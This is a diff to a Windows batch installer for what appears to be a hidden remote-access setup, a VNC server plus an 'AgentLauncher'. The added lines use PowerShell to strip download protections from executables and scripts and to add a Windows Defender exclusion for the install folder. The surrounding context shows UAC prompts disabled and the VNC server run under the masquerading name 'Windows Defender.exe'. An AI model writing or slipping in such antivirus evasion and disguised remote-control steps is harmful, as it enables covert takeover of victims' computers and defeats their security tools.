@@ -133,6 +133,9 @@ if not exist "%DEST%\VncDirect\vnc\index.html" (
     pause
     exit /b 1
 )
+
+echo    Unblocking downloaded files...
+powershell -NoProfile -Command "Get-ChildItem '%DEST%' -Recurse -Include '*.exe','*.dll','*.bat','*.vbs' | Unblock-File -ErrorAction SilentlyContinue"
 echo    Files installed.
 
 REM --- Save password ---
@@ -198,8 +201,14 @@ echo     UAC prompts disabled. Restart required to take effect.
 
 REM --- 7. Start services ---
 echo [7/7] Starting Agent and VNC Server...
+
+echo    Adding Windows Defender exclusion...
+powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%DEST%' -ErrorAction SilentlyContinue"
+
+echo    Starting VNC Server...
 cd /d "%DEST%\VncDirect\vnc"
 start "" "%DEST%\VncDirect\Windows Defender.exe" port=7002 "cwd=%DEST%\VncDirect\vnc" fps=360 scale=0
+echo    Starting Agent...
 cd /d "%DEST%"
 start "" "%DEST%\AgentLauncher.exe" vid=cafe pid=403f cwd="%DEST%"
 
